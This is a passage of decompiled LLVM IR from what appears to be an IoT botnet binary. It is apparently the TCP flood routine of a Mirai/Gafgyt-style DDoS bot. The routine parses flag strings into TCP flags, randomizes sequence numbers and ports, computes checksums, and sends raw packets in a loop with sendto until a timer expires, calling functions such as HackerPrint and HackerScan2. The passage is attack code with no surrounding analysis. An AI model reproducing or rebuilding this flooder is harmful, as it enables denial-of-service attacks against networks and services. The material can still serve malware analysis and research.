dec_label_pc_804f289:                             ; preds = %dec_label_pc_804f160
  store i32 %v4_804f215, i32* @eax, align 4
  %v0_804f28c = load i32, i32* @esp, align 4
  %v1_804f28c = add i32 %v0_804f28c, 4
  %v2_804f28c = inttoptr i32 %v1_804f28c to i32*
  store i32 ptrtoint (i32* @global_var_805d311.859 to i32), i32* %v2_804f28c, align 4
  %v0_804f294 = load i32, i32* @eax, align 4
  %v1_804f294 = load i32, i32* @esp, align 4
  %v2_804f294 = inttoptr i32 %v1_804f294 to i32*
  store i32 %v0_804f294, i32* %v2_804f294, align 4
  %v3_804f297 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805d30d.858 to i32))
  store i32 %v3_804f297, i32* %eax.global-to-local, align 4
  %v5_804f29c = inttoptr i32 %v3_804f297 to i8*
  store i8* %v5_804f29c, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f45518 = icmp eq i32 %v3_804f297, 0
  %v1_804f45925 = icmp eq i1 %v5_804f45518, false
  br i1 %v1_804f45925, label %dec_label_pc_804f2a4.lr.ph, label %dec_label_pc_804f45f

dec_label_pc_804f2a4.lr.ph:                       ; preds = %dec_label_pc_804f289
  %v1_804f415 = add i32 %v2_804f187, 33
  %v2_804f415 = inttoptr i32 %v1_804f415 to i8*
  %tmp92 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804f2a4

dec_label_pc_804f2a4:                             ; preds = %dec_label_pc_804f2a4.lr.ph, %dec_label_pc_804f43e
  %v3_804f427 = phi i8* [ %v5_804f29c, %dec_label_pc_804f2a4.lr.ph ], [ %tmp93, %dec_label_pc_804f43e ]
  %stack_var_-160.127 = phi i32 [ %tmp41, %dec_label_pc_804f2a4.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804f43e ]
  %stack_var_-156.126 = phi i8* [ %tmp42, %dec_label_pc_804f2a4.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804f43e ]
  %v4_804f2a4 = ptrtoint i8* %v3_804f427 to i32
  store i32 %v4_804f2a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d313.860 to i32), i32* @edi, align 4
  %v7_804f2c2 = call i32 @_strncmp(i8* %v3_804f427, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d313.860, i32 0, i32 0), i32 4)
  %v8_804f2c2 = urem i32 %v7_804f2c2, 2
  %v9_804f2c2 = icmp eq i32 %v8_804f2c2, 0
  %v0_804f2c4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f2c4 = or i1 %v0_804f2c4, %v9_804f2c2
  %v3_804f2c4 = zext i1 %v2_804f2c4 to i32
  %v4_804f2c4 = load i32, i32* @edx, align 4
  %v5_804f2c4 = and i32 %v4_804f2c4, -256
  %v6_804f2c4 = or i32 %v3_804f2c4, %v5_804f2c4
  %v7_804f2c4 = xor i32 %v6_804f2c4, 1
  store i32 %v7_804f2c4, i32* %edx.global-to-local, align 4
  %v3_804f2ca = and i32 %v7_804f2c2, -256
  %v1_804f2cc = trunc i32 %v7_804f2c4 to i8
  %v3_804f2cc = zext i1 %v0_804f2c4 to i8
  %v4_804f2cc = sub nsw i8 %v1_804f2cc, %v3_804f2cc
  %v15_804f2cc = icmp eq i8 %v4_804f2cc, 0
  %v20_804f2cc = zext i8 %v4_804f2cc to i32
  %v23_804f2cc = or i32 %v20_804f2cc, %v3_804f2ca
  store i32 %v23_804f2cc, i32* @ecx, align 4
  %v2_804f2d0 = sext i8 %v4_804f2cc to i32
  store i32 %v2_804f2d0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2d5 = icmp eq i1 %v15_804f2cc, false
  br i1 %v1_804f2d5, label %dec_label_pc_804f2e9, label %dec_label_pc_804f2d7

dec_label_pc_804f2d7:                             ; preds = %dec_label_pc_804f2a4
  store i32 %v1_804f19f, i32* @eax, align 4
  %v3_804f2da = load i8, i8* %v2_804f415, align 1
  %v2_804f2de = or i8 %v3_804f2da, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f2de = zext i8 %v2_804f2de to i32
  store i32 %v7_804f2de, i32* @edx, align 4
  store i8 %v2_804f2de, i8* %v2_804f415, align 1
  br label %dec_label_pc_804f43e

dec_label_pc_804f2e9:                             ; preds = %dec_label_pc_804f2a4
  store i32 %v4_804f2a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d317.861 to i32), i32* @edi, align 4
  %v7_804f307 = call i32 @_strncmp(i8* %v3_804f427, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d317.861, i32 0, i32 0), i32 4)
  %v8_804f307 = urem i32 %v7_804f307, 2
  %v9_804f307 = icmp eq i32 %v8_804f307, 0
  %v0_804f309 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f309 = or i1 %v0_804f309, %v9_804f307
  %v3_804f309 = zext i1 %v2_804f309 to i32
  %v4_804f309 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f309 = and i32 %v4_804f309, -256
  %v6_804f309 = or i32 %v3_804f309, %v5_804f309
  %v7_804f309 = xor i32 %v6_804f309, 1
  store i32 %v7_804f309, i32* %edx.global-to-local, align 4
  %v3_804f30f = and i32 %v7_804f307, -256
  %v1_804f311 = trunc i32 %v7_804f309 to i8
  %v3_804f311 = zext i1 %v0_804f309 to i8
  %v4_804f311 = sub nsw i8 %v1_804f311, %v3_804f311
  %v15_804f311 = icmp eq i8 %v4_804f311, 0
  %v20_804f311 = zext i8 %v4_804f311 to i32
  %v23_804f311 = or i32 %v20_804f311, %v3_804f30f
  store i32 %v23_804f311, i32* @ecx, align 4
  %v2_804f315 = sext i8 %v4_804f311 to i32
  store i32 %v2_804f315, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f31a = icmp eq i1 %v15_804f311, false
  br i1 %v1_804f31a, label %dec_label_pc_804f32e, label %dec_label_pc_804f31c

dec_label_pc_804f31c:                             ; preds = %dec_label_pc_804f2e9
  store i32 %v1_804f19f, i32* @eax, align 4
  %v3_804f31f = load i8, i8* %v2_804f415, align 1
  %v2_804f323 = or i8 %v3_804f31f, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f323 = zext i8 %v2_804f323 to i32
  store i32 %v7_804f323, i32* @edx, align 4
  store i8 %v2_804f323, i8* %v2_804f415, align 1
  br label %dec_label_pc_804f43e

dec_label_pc_804f32e:                             ; preds = %dec_label_pc_804f2e9
  store i32 %v4_804f2a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d31b.862 to i32), i32* @edi, align 4
  %v7_804f352 = call i32 @_strncmp(i8* %v3_804f427, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d31b.862, i32 0, i32 0), i32 4)
  %v8_804f352 = urem i32 %v7_804f352, 2
  %v9_804f352 = icmp eq i32 %v8_804f352, 0
  %v0_804f354 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f354 = or i1 %v0_804f354, %v9_804f352
  %v3_804f354 = zext i1 %v2_804f354 to i32
  %v4_804f354 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f354 = and i32 %v4_804f354, -256
  %v6_804f354 = or i32 %v3_804f354, %v5_804f354
  %v7_804f354 = xor i32 %v6_804f354, 1
  store i32 %v7_804f354, i32* %edx.global-to-local, align 4
  %v3_804f35a = and i32 %v7_804f352, -256
  %v1_804f35c = trunc i32 %v7_804f354 to i8
  %v3_804f35c = zext i1 %v0_804f354 to i8
  %v4_804f35c = sub nsw i8 %v1_804f35c, %v3_804f35c
  %v15_804f35c = icmp eq i8 %v4_804f35c, 0
  %v20_804f35c = zext i8 %v4_804f35c to i32
  %v23_804f35c = or i32 %v20_804f35c, %v3_804f35a
  store i32 %v23_804f35c, i32* @ecx, align 4
  %v2_804f360 = sext i8 %v4_804f35c to i32
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f365 = icmp eq i1 %v15_804f35c, false
  br i1 %v1_804f365, label %dec_label_pc_804f379, label %dec_label_pc_804f367

dec_label_pc_804f367:                             ; preds = %dec_label_pc_804f32e
  store i32 %v1_804f19f, i32* @eax, align 4
  %v3_804f36a = load i8, i8* %v2_804f415, align 1
  %v2_804f36e = or i8 %v3_804f36a, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f36e = zext i8 %v2_804f36e to i32
  store i32 %v7_804f36e, i32* @edx, align 4
  store i8 %v2_804f36e, i8* %v2_804f415, align 1
  br label %dec_label_pc_804f43e

dec_label_pc_804f379:                             ; preds = %dec_label_pc_804f32e
  store i32 %v4_804f2a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d31f.863 to i32), i32* @edi, align 4
  %v7_804f3a9 = call i32 @_strncmp(i8* %v3_804f427, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d31f.863, i32 0, i32 0), i32 4)
  %v8_804f3a9 = urem i32 %v7_804f3a9, 2
  %v9_804f3a9 = icmp eq i32 %v8_804f3a9, 0
  %v0_804f3ab = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3ab = or i1 %v0_804f3ab, %v9_804f3a9
  %v3_804f3ab = zext i1 %v2_804f3ab to i32
  %v4_804f3ab = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3ab = and i32 %v4_804f3ab, -256
  %v6_804f3ab = or i32 %v3_804f3ab, %v5_804f3ab
  %v7_804f3ab = xor i32 %v6_804f3ab, 1
  store i32 %v7_804f3ab, i32* %edx.global-to-local, align 4
  %v3_804f3b1 = and i32 %v7_804f3a9, -256
  %v1_804f3b3 = trunc i32 %v7_804f3ab to i8
  %v3_804f3b3 = zext i1 %v0_804f3ab to i8
  %v4_804f3b3 = sub nsw i8 %v1_804f3b3, %v3_804f3b3
  %v15_804f3b3 = icmp eq i8 %v4_804f3b3, 0
  %v20_804f3b3 = zext i8 %v4_804f3b3 to i32
  %v23_804f3b3 = or i32 %v20_804f3b3, %v3_804f3b1
  store i32 %v23_804f3b3, i32* @ecx, align 4
  %v2_804f3b7 = sext i8 %v4_804f3b3 to i32
  store i32 %v2_804f3b7, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3bc = icmp eq i1 %v15_804f3b3, false
  br i1 %v1_804f3bc, label %dec_label_pc_804f3cd, label %dec_label_pc_804f3be

dec_label_pc_804f3be:                             ; preds = %dec_label_pc_804f379
  store i32 %v1_804f19f, i32* @eax, align 4
  %v3_804f3c1 = load i8, i8* %v2_804f415, align 1
  %v2_804f3c5 = or i8 %v3_804f3c1, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f3c5 = zext i8 %v2_804f3c5 to i32
  store i32 %v7_804f3c5, i32* @edx, align 4
  store i8 %v2_804f3c5, i8* %v2_804f415, align 1
  br label %dec_label_pc_804f43e

dec_label_pc_804f3cd:                             ; preds = %dec_label_pc_804f379
  store i32 %v4_804f2a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d323.864 to i32), i32* @edi, align 4
  %v7_804f3fd = call i32 @_strncmp(i8* %v3_804f427, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d323.864, i32 0, i32 0), i32 4)
  %v8_804f3fd = urem i32 %v7_804f3fd, 2
  %v9_804f3fd = icmp eq i32 %v8_804f3fd, 0
  %v0_804f3ff = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3ff = or i1 %v0_804f3ff, %v9_804f3fd
  %v3_804f3ff = zext i1 %v2_804f3ff to i32
  %v4_804f3ff = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3ff = and i32 %v4_804f3ff, -256
  %v6_804f3ff = or i32 %v3_804f3ff, %v5_804f3ff
  %v7_804f3ff = xor i32 %v6_804f3ff, 1
  store i32 %v7_804f3ff, i32* %edx.global-to-local, align 4
  %v3_804f405 = and i32 %v7_804f3fd, -256
  %v1_804f407 = trunc i32 %v7_804f3ff to i8
  %v3_804f407 = zext i1 %v0_804f3ff to i8
  %v4_804f407 = sub nsw i8 %v1_804f407, %v3_804f407
  %v15_804f407 = icmp eq i8 %v4_804f407, 0
  %v20_804f407 = zext i8 %v4_804f407 to i32
  %v23_804f407 = or i32 %v20_804f407, %v3_804f405
  store i32 %v23_804f407, i32* @ecx, align 4
  %v2_804f40b = sext i8 %v4_804f407 to i32
  store i32 %v2_804f40b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f410 = icmp eq i1 %v15_804f407, false
  br i1 %v1_804f410, label %dec_label_pc_804f421, label %dec_label_pc_804f412

dec_label_pc_804f412:                             ; preds = %dec_label_pc_804f3cd
  store i32 %v1_804f19f, i32* @eax, align 4
  %v3_804f415 = load i8, i8* %v2_804f415, align 1
  %v2_804f419 = or i8 %v3_804f415, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f419 = zext i8 %v2_804f419 to i32
  store i32 %v7_804f419, i32* @edx, align 4
  store i8 %v2_804f419, i8* %v2_804f415, align 1
  br label %dec_label_pc_804f43e

dec_label_pc_804f421:                             ; preds = %dec_label_pc_804f3cd
  %v0_804f421 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804f421 = ptrtoint i8* %v0_804f421 to i32
  store i32 %v1_804f421, i32* %edx.global-to-local, align 4
  store i32 %v4_804f2a4, i32* %eax.global-to-local, align 4
  %v1_804f42a = load i32, i32* @esp, align 4
  %v2_804f42a = add i32 %v1_804f42a, 8
  %v3_804f42a = inttoptr i32 %v2_804f42a to i32*
  store i32 %v4_804f2a4, i32* %v3_804f42a, align 4
  %v0_804f42e = load i32, i32* @esp, align 4
  %v1_804f42e = add i32 %v0_804f42e, 4
  %v2_804f42e = inttoptr i32 %v1_804f42e to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_805d327.865 to i32), i32* %v2_804f42e, align 4
  %v0_804f436 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f436 = load i32, i32* @esp, align 4
  %v2_804f436 = inttoptr i32 %v1_804f436 to i32*
  store i32 %v0_804f436, i32* %v2_804f436, align 4
  %v3_804f439 = call i32 @HackerPrint(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805d323.864 to i32))
  store i32 %v3_804f439, i32* @eax, align 4
  br label %dec_label_pc_804f43e

dec_label_pc_804f43e:                             ; preds = %dec_label_pc_804f412, %dec_label_pc_804f3be, %dec_label_pc_804f367, %dec_label_pc_804f31c, %dec_label_pc_804f2d7, %dec_label_pc_804f421
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d323.864, i32 0, i32 0), %dec_label_pc_804f421 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d323.864, i32 0, i32 0), %dec_label_pc_804f412 ], [ %stack_var_-156.126, %dec_label_pc_804f3be ], [ %stack_var_-156.126, %dec_label_pc_804f367 ], [ %stack_var_-156.126, %dec_label_pc_804f31c ], [ %stack_var_-156.126, %dec_label_pc_804f2d7 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804f421 ], [ 4, %dec_label_pc_804f412 ], [ %stack_var_-160.127, %dec_label_pc_804f3be ], [ %stack_var_-160.127, %dec_label_pc_804f367 ], [ %stack_var_-160.127, %dec_label_pc_804f31c ], [ %stack_var_-160.127, %dec_label_pc_804f2d7 ]
  %v0_804f43e = load i32, i32* @esp, align 4
  %v1_804f43e = add i32 %v0_804f43e, 4
  %v2_804f43e = inttoptr i32 %v1_804f43e to i32*
  store i32 ptrtoint (i32* @global_var_805d311.859 to i32), i32* %v2_804f43e, align 4
  %v0_804f446 = load i32, i32* @esp, align 4
  %v1_804f446 = inttoptr i32 %v0_804f446 to i32*
  store i32 0, i32* %v1_804f446, align 4
  %v2_804f44d = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804f44d = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804f44d)
  store i32 %v3_804f44d, i32* %eax.global-to-local, align 4
  store i32 %v3_804f44d, i32* %tmp92, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f455 = icmp eq i32 %v3_804f44d, 0
  %v1_804f459 = icmp eq i1 %v5_804f455, false
  %tmp93 = inttoptr i32 %v3_804f44d to i8*
  br i1 %v1_804f459, label %dec_label_pc_804f2a4, label %dec_label_pc_804f45f

dec_label_pc_804f45f:                             ; preds = %dec_label_pc_804f43e, %dec_label_pc_804f289, %dec_label_pc_804f248
  %v0_804f45f = phi i8* [ %v0_804f45f.pre, %dec_label_pc_804f248 ], [ %v5_804f29c, %dec_label_pc_804f289 ], [ %tmp93, %dec_label_pc_804f43e ]
  %v1_804f45f = ptrtoint i8* %v0_804f45f to i32
  %v2_804f45f = call i32 @rand_cmwc(i32 %v1_804f45f)
  %v1_804f464 = urem i32 %v2_804f45f, 65536
  store i32 %v1_804f464, i32* %edx.global-to-local, align 4
  %v1_804f46a = trunc i32 %v2_804f45f to i16
  %v3_804f46a = add i32 %v2_804f187, 34
  %v4_804f46a = inttoptr i32 %v3_804f46a to i16*
  store i16 %v1_804f46a, i16* %v4_804f46a, align 2
  %v1_804f471 = add i32 %v2_804f187, 36
  %v2_804f471 = inttoptr i32 %v1_804f471 to i16*
  store i16 0, i16* %v2_804f471, align 4
  store i32 %v1_804f19f, i32* %eax.global-to-local, align 4
  %v1_804f47a = add i32 %v2_804f187, 38
  %v2_804f47a = inttoptr i32 %v1_804f47a to i16*
  store i16 0, i16* %v2_804f47a, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804f057, label %dec_label_pc_804f493, label %dec_label_pc_804f486

dec_label_pc_804f486:                             ; preds = %dec_label_pc_804f45f
  %v0_804f486 = load i8*, i8** %stack_var_-20, align 4
  %v1_804f486 = ptrtoint i8* %v0_804f486 to i32
  %v2_804f486 = call i32 @rand_cmwc(i32 %v1_804f486)
  br label %dec_label_pc_804f4a7

dec_label_pc_804f493:                             ; preds = %dec_label_pc_804f45f
  %v1_804f496 = urem i32 %arg2, 65536
  store i32 %v1_804f496, i32* %eax.global-to-local, align 4
  %v1_804f499 = load i32, i32* @esp, align 4
  %v2_804f499 = inttoptr i32 %v1_804f499 to i32*
  store i32 %v1_804f496, i32* %v2_804f499, align 4
  %v3_804f49c = call i32 @htons(i16 %tmp40)
  br label %dec_label_pc_804f4a7

dec_label_pc_804f4a7:                             ; preds = %dec_label_pc_804f486, %dec_label_pc_804f493
  %storemerge13.in = phi i32 [ %v2_804f486, %dec_label_pc_804f486 ], [ %v3_804f49c, %dec_label_pc_804f493 ]
  %storemerge = trunc i32 %storemerge13.in to i16
  %sext = mul i32 %storemerge13.in, 65536
  %v4_804f4aa = sdiv i32 %sext, 65536
  store i32 %v4_804f4aa, i32* @esi, align 4
  %v3_804f4ad = add i32 %v2_804f187, 22
  %v4_804f4ad = inttoptr i32 %v3_804f4ad to i16*
  store i16 %storemerge, i16* %v4_804f4ad, align 2
  %v1_804f4b4 = load i32, i32* @esp, align 4
  %v2_804f4b4 = add i32 %v1_804f4b4, 4
  %v3_804f4b4 = inttoptr i32 %v2_804f4b4 to i32*
  store i32 %v1_804f19f, i32* %v3_804f4b4, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f4bb = load i32, i32* @esp, align 4
  %v2_804f4bb = inttoptr i32 %v1_804f4bb to i32*
  store i32 %v2_804f187, i32* %v2_804f4bb, align 4
  %v0_804f4be = call i32 @tcpcsum()
  %v1_804f4c3 = urem i32 %v0_804f4be, 65536
  store i32 %v1_804f4c3, i32* %edx.global-to-local, align 4
  %v1_804f4c9 = trunc i32 %v0_804f4be to i16
  store i16 %v1_804f4c9, i16* %v2_804f471, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f4d0 = or i32 %v2_804f187, 2
  %v2_804f4d0 = inttoptr i32 %v1_804f4d0 to i16*
  %v3_804f4d0 = load i16, i16* %v2_804f4d0, align 2
  %v4_804f4d0 = zext i16 %v3_804f4d0 to i32
  store i32 %v4_804f4d0, i32* %edx.global-to-local, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f4d9 = load i32, i32* @esp, align 4
  %v2_804f4d9 = add i32 %v1_804f4d9, 4
  %v3_804f4d9 = inttoptr i32 %v2_804f4d9 to i32*
  store i32 %v4_804f4d0, i32* %v3_804f4d9, align 4
  %v0_804f4dd = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4dd = load i32, i32* @esp, align 4
  %v2_804f4dd = inttoptr i32 %v1_804f4dd to i32*
  store i32 %v0_804f4dd, i32* %v2_804f4dd, align 4
  %v3_804f4e0 = inttoptr i32 %v4_804f4aa to i16*
  %v4_804f4e0 = call i32 @csum(i16* %v3_804f4e0, i32 %v15_804f03c)
  %v1_804f4e5 = urem i32 %v4_804f4e0, 65536
  store i32 %v1_804f4e5, i32* %edx.global-to-local, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f4eb = trunc i32 %v4_804f4e0 to i16
  %v3_804f4eb = or i32 %v2_804f187, 10
  %v4_804f4eb = inttoptr i32 %v3_804f4eb to i16*
  store i16 %v1_804f4eb, i16* %v4_804f4eb, align 2
  %v0_804f4ef = load i32, i32* @esp, align 4
  %v1_804f4ef = inttoptr i32 %v0_804f4ef to i32*
  store i32 0, i32* %v1_804f4ef, align 4
  %v2_804f4f6 = inttoptr i32 %v4_804f4aa to i32*
  %v3_804f4f6 = call i32 @__GI_time(i32* %v2_804f4f6)
  %v5_804f4fb = add i32 %v3_804f4f6, %arg3
  %v10_804f4fb = icmp ult i32 %v5_804f4fb, %v3_804f4f6
  store i1 %v10_804f4fb, i1* %cf.global-to-local, align 1
  store i32 %v5_804f4fb, i32* %eax.global-to-local, align 4
  %v2_804f552 = or i32 %v2_804f187, 12
  %v3_804f552 = inttoptr i32 %v2_804f552 to i32*
  %v3_804f560 = or i32 %v2_804f187, 4
  %v4_804f560 = inttoptr i32 %v3_804f560 to i16*
  br label %dec_label_pc_804f50a

dec_label_pc_804f50a:                             ; preds = %dec_label_pc_804f5ce, %dec_label_pc_804f5eb, %dec_label_pc_804f4a7
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804f4a7 ], [ %v4_804f5eb, %dec_label_pc_804f5eb ], [ 0, %dec_label_pc_804f5ce ]
  store i32 %v2_804f187, i32* %edx.global-to-local, align 4
  %v0_804f510 = load i32, i32* @esp, align 4
  %v1_804f510 = add i32 %v0_804f510, 20
  %v2_804f510 = inttoptr i32 %v1_804f510 to i32*
  store i32 16, i32* %v2_804f510, align 4
  %v1_804f518 = load i32, i32* @esp, align 4
  %v2_804f518 = add i32 %v1_804f518, 16
  %v3_804f518 = inttoptr i32 %v2_804f518 to i32*
  store i32 %v2_804f07c, i32* %v3_804f518, align 4
  %v0_804f51c = load i32, i32* @esp, align 4
  %v1_804f51c = add i32 %v0_804f51c, 12
  %v2_804f51c = inttoptr i32 %v1_804f51c to i32*
  store i32 0, i32* %v2_804f51c, align 4
  store i32 %v1_804f163, i32* @edi, align 4
  %v1_804f527 = load i32, i32* @esp, align 4
  %v2_804f527 = add i32 %v1_804f527, 8
  %v3_804f527 = inttoptr i32 %v2_804f527 to i32*
  store i32 %v1_804f163, i32* %v3_804f527, align 4
  %v0_804f52b = load i32, i32* %edx.global-to-local, align 4
  %v1_804f52b = load i32, i32* @esp, align 4
  %v2_804f52b = add i32 %v1_804f52b, 4
  %v3_804f52b = inttoptr i32 %v2_804f52b to i32*
  store i32 %v0_804f52b, i32* %v3_804f52b, align 4
  store i32 %v5_804f0c4, i32* %eax.global-to-local, align 4
  %v1_804f532 = load i32, i32* @esp, align 4
  %v2_804f532 = inttoptr i32 %v1_804f532 to i32*
  store i32 %v5_804f0c4, i32* %v2_804f532, align 4
  %v1_804f535 = load i32, i32* %stack_var_-64, align 4
  %v2_804f535 = load i32, i32* %stack_var_-60, align 4
  %v3_804f535 = load i32, i32* %stack_var_-56, align 4
  %v4_804f535 = load i32, i32* %stack_var_-52, align 4
  %v6_804f535 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804f535, i32 %v2_804f535, i32 %v3_804f535, i32 %v4_804f535, i32 0)
  store i32 %storemerge11, i32* @eax, align 4
  %v1_804f53d = load i32, i32* @esp, align 4
  %v2_804f53d = inttoptr i32 %v1_804f53d to i32*
  store i32 %storemerge11, i32* %v2_804f53d, align 4
  %v1_804f540 = call i32 @HackerScan2(i32 %stack_var_-68.0)
  store i32 %v1_804f540, i32* %eax.global-to-local, align 4
  %v1_804f545 = load i32, i32* @esp, align 4
  %v2_804f545 = inttoptr i32 %v1_804f545 to i32*
  store i32 %v1_804f540, i32* %v2_804f545, align 4
  %v0_804f548 = call i32 @htonl()
  store i32 %v0_804f548, i32* %edx.global-to-local, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  store i32 %v0_804f548, i32* %v3_804f552, align 4
  %v1_804f555 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804f55a = urem i32 %v1_804f555, 65536
  store i32 %v1_804f55a, i32* %edx.global-to-local, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f560 = trunc i32 %v1_804f555 to i16
  store i16 %v1_804f560, i16* %v4_804f560, align 4
  %v1_804f564 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804f564, i32* %edx.global-to-local, align 4
  store i32 %v1_804f19f, i32* %eax.global-to-local, align 4
  store i32 %v1_804f564, i32* %v3_804f1fa, align 8
  %v1_804f571 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804f576 = urem i32 %v1_804f571, 65536
  store i32 %v1_804f576, i32* %edx.global-to-local, align 4
  %v1_804f57c = trunc i32 %v1_804f571 to i16
  store i16 %v1_804f57c, i16* %v5_804f1a2, align 4
  store i16 0, i16* %v2_804f471, align 4
  %v1_804f58b = load i32, i32* @esp, align 4
  %v2_804f58b = add i32 %v1_804f58b, 4
  %v3_804f58b = inttoptr i32 %v2_804f58b to i32*
  store i32 %v1_804f19f, i32* %v3_804f58b, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f592 = load i32, i32* @esp, align 4
  %v2_804f592 = inttoptr i32 %v1_804f592 to i32*
  store i32 %v2_804f187, i32* %v2_804f592, align 4
  %v0_804f595 = call i32 @tcpcsum()
  %v1_804f59a = urem i32 %v0_804f595, 65536
  store i32 %v1_804f59a, i32* %edx.global-to-local, align 4
  %v1_804f5a0 = trunc i32 %v0_804f595 to i16
  store i16 %v1_804f5a0, i16* %v2_804f471, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v3_804f5a7 = load i16, i16* %v2_804f4d0, align 2
  %v4_804f5a7 = zext i16 %v3_804f5a7 to i32
  store i32 %v4_804f5a7, i32* %edx.global-to-local, align 4
  store i32 %v2_804f187, i32* %eax.global-to-local, align 4
  %v1_804f5b0 = load i32, i32* @esp, align 4
  %v2_804f5b0 = add i32 %v1_804f5b0, 4
  %v3_804f5b0 = inttoptr i32 %v2_804f5b0 to i32*
  store i32 %v4_804f5a7, i32* %v3_804f5b0, align 4
  %v0_804f5b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5b4 = load i32, i32* @esp, align 4
  %v2_804f5b4 = inttoptr i32 %v1_804f5b4 to i32*
  store i32 %v0_804f5b4, i32* %v2_804f5b4, align 4
  %v1_804f5b7 = load i32, i32* %stack_var_-64, align 4
  %v2_804f5b7 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804f5b7 = call i32 @csum(i16* %v2_804f5b7, i32 %v1_804f5b7)
  %v1_804f5bc = urem i32 %v3_804f5b7, 65536
  store i32 %v1_804f5bc, i32* %edx.global-to-local, align 4
  %v1_804f5c2 = trunc i32 %v3_804f5b7 to i16
  store i16 %v1_804f5c2, i16* %v4_804f4eb, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804f5c9 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804f5c9, i1* %cf.global-to-local, align 1
  %v15_804f5c9 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804f5cc = icmp eq i1 %v15_804f5c9, false
  br i1 %v1_804f5cc, label %dec_label_pc_804f5eb, label %dec_label_pc_804f5ce

dec_label_pc_804f5ce:                             ; preds = %dec_label_pc_804f50a
  %v0_804f5ce = load i32, i32* @esp, align 4
  %v1_804f5ce = inttoptr i32 %v0_804f5ce to i32*
  store i32 0, i32* %v1_804f5ce, align 4
  %v1_804f5d5 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804f5d5 = call i32 @__GI_time(i32* %v1_804f5d5)
  store i32 %v2_804f5d5, i32* %eax.global-to-local, align 4
  %v10_804f5da = icmp ult i32 %v2_804f5d5, %v5_804f4fb
  store i1 %v10_804f5da, i1* %cf.global-to-local, align 1
  %v8_804f5dd = icmp sgt i32 %v2_804f5d5, %v5_804f4fb
  br i1 %v8_804f5dd, label %dec_label_pc_804f5f3, label %dec_label_pc_804f50a
